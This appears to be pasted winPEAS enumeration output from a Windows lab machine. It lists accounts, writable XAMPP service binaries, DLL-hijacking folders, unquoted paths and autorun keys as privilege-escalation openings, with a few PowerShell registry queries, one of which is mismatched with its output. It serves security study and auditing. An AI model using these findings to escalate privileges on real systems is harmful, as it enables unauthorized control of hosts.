R0BJ3CK\Administrator: Built-in account for administering the computer/domain

|->Groups: Administrators

|->Password: CanChange-NotExpi-Req

R0BJ3CK\DefaultAccount(Disabled): A user account managed by the system.

|->Groups: System Managed Accounts Group

|->Password: CanChange-NotExpi-NotReq

R0BJ3CK\Guest(Disabled): Built-in account for guest access to the computer/domain.

|->Groups: Guests

|->Password: NotChange-NotExpi-NotReq

R0BJ3CK\rob

|->Password: CanChange-NotExpi-NotReq

R0BJ3CK\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.

|->Groups: Users Managed Accounts Group

|->Password: CanChange-Expi-Req

---

????????????????????????????????????? Processes Information ?????????????????????????????????????

???????????? Interesting Processes -non Microsoft-

? Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes

httpd(4492)[C:\xampp\apache\bin\httpd.exe] -- POwn: rob

Permissions: Authenticated Users [WriteData/CreateFiles]

Possible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])

Command Line: C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache

=================================================================================================

httpd(3452)[C:\xampp\apache\bin\httpd.exe] -- POwn: rob

Permissions: Authenticated Users [WriteData/CreateFiles]

Possible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])

Command Line: "C:\xampp\apache\bin\httpd.exe" -k runservice

=================================================================================================

winPEASany(1656)[C:\Windows\Temp\winPEASany.exe] -- POwn: rob -- isDotNet

Permissions: rob [AllAccess]

Possible DLL Hijacking folder: C:\Windows\Temp (Users [WriteData/CreateFiles], rob [AllAccess])

Command Line: "C:\Windows\Temp\winPEASany.exe"

=================================================================================================

conhost(2568)[C:\Windows\system32\conhost.exe] -- POwn: rob

Command Line: \??\C:\Windows\system32\conhost.exe 0x4

????????????????????????????????????? Services Information ?????????????????????????????????????

???????????? Interesting Services -non Microsoft-

? Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services

Apache2.4(Apache Software Foundation - Apache2.4)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Auto - Running

File Permissions: Authenticated Users [WriteData/CreateFiles]

Possible DLL Hijacking in binary folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])

Apache/2.4.26 (Win32) OpenSSL/1.0.2l PHP/5.6.31

=================================================================================================

CustomDevService(CustomDevService)["c:\Program Files\CustomDevService\CustomDevService.exe"] - Auto - Running

Possible DLL Hijacking in binary folder: c:\Program Files\CustomDevService (rob [WriteData/CreateFiles AllAccess])

=================================================================================================

mysql(mysql)[C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql] - Auto - Running - No quotes and Space detected

File Permissions: Authenticated Users [WriteData/CreateFiles]

Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (Authenticated Users [WriteData/CreateFiles])

=================================================================================================

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run

Key: VMware User Process

Folder: C:\Program Files\VMware\VMware Tools

File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)

=================================================================================================

RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

RegPerms: rob [FullControl]

Key: OneDrive

Folder: C:\Users\rob\AppData\Local\Microsoft\OneDrive

FolderPerms: rob [AllAccess]

File: C:\Users\rob\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background

FilePerms: rob [AllAccess]

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

Key: Common Startup

Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

Key: Common Startup

Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)

=================================================================================================

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

Key: Shell

Folder: None (PATH Injection)

File: explorer.exe

PS C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT"\CurrentVersion\Winlogon"

User accounts for \\R0BJ3CK

-------------------------------------------------------------------------------

Administrator            DefaultAccount           Guest

rob                      WDAGUtilityAccount

The command completed successfully.

PS C:\> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

DefaultDomainName    REG_SZ

DefaultUserName    REG_SZ

PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}

Shell    REG_SZ    explorer.exe

ShellCritical    REG_DWORD    0x0

SiHostCritical    REG_DWORD    0x0

SiHostReadyTimeOut    REG_DWORD    0x0

SiHostRestartCountLimit    REG_DWORD    0x0

SiHostRestartTimeGap    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions

PS C:\>

---

RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot

Key: AlternateShell

Folder: None (PATH Injection)

File: cmd.exe

---

Key: From WMIC

Folder: C:\Users\rob\AppData\Local\Microsoft\OneDrive

FolderPerms: rob [AllAccess]

File: C:\Users\rob\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background

FilePerms: rob [AllAccess]

---

???????????? Looking for possible password files in users homes

?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

???????????? Searching executable files in non-default folders with write (equivalent) permissions (can be slow)

File Permissions "C:\xampp\mailtodisk\mailtodisk.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\resetroot.bat": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\mysql_uninstallservice.bat": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\mysql_installservice.bat": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\scripts\ctl.bat": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\aria_chk.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\aria_dump_log.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\aria_ftdump.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\aria_pack.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\aria_read_log.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\echo.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\innochecksum.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mariabackup.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mbstream.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\myisamchk.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\myisamlog.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\myisampack.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\myisam_ftdump.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysql.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqladmin.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqlbinlog.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqlcheck.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqld.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqldump.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqlimport.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqlshow.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqlslap.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqltest.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysqltest_embedded.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysql_client_test.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysql_client_test_embedded.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysql_embedded.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysql_install_db.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysql_plugin.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysql_tzinfo_to_sql.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysql_upgrade.exe": Authenticated Users [WriteData/CreateFiles]

File Permissions "C:\xampp\mysql\bin\mysql_upgrade_service.exe": Authenticated Users [WriteData/CreateFiles]
```
